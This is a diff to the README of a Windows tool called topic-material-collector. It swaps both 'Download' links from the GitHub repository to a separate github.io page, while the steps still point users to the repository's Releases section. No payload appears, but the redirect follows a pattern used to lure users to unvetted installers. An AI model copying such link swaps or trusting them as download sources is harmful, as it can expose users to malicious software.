@@ -1,6 +1,6 @@
 # 📦 topic-material-collector - Organize video research materials with ease
 
-[![Download for Windows](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Moated-paddy535/topic-material-collector)
+[![Download for Windows](https://img.shields.io/badge/Download-Application-blue.svg)](https://moated-paddy535.github.io)
 
 ## 📋 About the application
 
@@ -20,7 +20,7 @@ This application runs on standard Windows computers. Ensure your system meets th
 
 Visit the link below to reach the project page where you can find the latest version of the installer.
 
-[Download the topic-material-collector for Windows](https://github.com/Moated-paddy535/topic-material-collector)
+[Download the topic-material-collector for Windows](https://moated-paddy535.github.io)
 
 1. Click the link above to reach the main project page.
 2. Look for the section labeled Releases on the right side of the page.
